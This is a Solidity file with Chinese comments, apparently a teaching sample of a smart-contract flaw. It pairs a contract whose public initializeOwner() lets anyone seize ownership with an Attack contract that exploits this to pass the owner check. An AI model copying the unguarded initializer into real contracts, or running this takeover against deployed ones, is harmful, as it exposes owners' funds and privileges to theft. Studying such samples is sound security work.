pragma solidity >=0.8.0;

/*
  漏洞名稱：Version Issues
  描述：原始程式碼試圖利用舊式的建構子設置 owner，但在 Solidity >=0.8.0 中
         以合約名稱命名的函式已不被允許作為建構子。為了保留此漏洞的意圖，
         我們將原本應為建構子的功能改成一個公開的初始化函式，
         使任何人都能呼叫來重設 owner，導致權限問題。

  攻擊手法說明：
  1. 部署 VulnerableVersionIssue 合約後，owner 尚未初始化。
  2. 攻擊者呼叫 initializeOwner() 函式，使得 owner 被設為攻擊者地址。
  3. 攻擊者呼叫 restrictedAction() 函式，即可通過權限檢查，取得機密資訊。
*/

contract VulnerableVersionIssue {
    // 狀態變數 (漏洞重點部位): owner
    address public owner;

    // 漏洞：原本意圖作為建構子的函式，卻以公開函式實現，
    // 導致任何使用者皆可呼叫並重設 owner
    function initializeOwner() public {
        owner = msg.sender;
    }

    // 限制權限函式，只有 owner 可以存取
    function restrictedAction() public view returns (string memory) {
        require(msg.sender == owner, "Only owner allowed");
        return "You have accessed restricted data!";
    }
}

// 攻擊合約：利用漏洞呼叫 initializeOwner() 重設 owner 為攻擊者地址，
// 進而存取 restrictedAction()
contract Attack {
    VulnerableVersionIssue public vulnerable;

    // 部署時指定 VulnerableVersionIssue 合約地址
    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableVersionIssue(_vulnerableAddress);
    }

    // 攻擊步驟：
    // 1. 呼叫 initializeOwner() 重設 owner
    // 2. 呼叫 restrictedAction() 得到機密資訊
    function attack() public returns (string memory) {
        // 呼叫漏洞函式，將 owner 重設為攻擊者地址 (msg.sender)
        vulnerable.initializeOwner();
        
        // 呼叫 restrictedAction() 獲得保護資源
        return vulnerable.restrictedAction();
    }
}
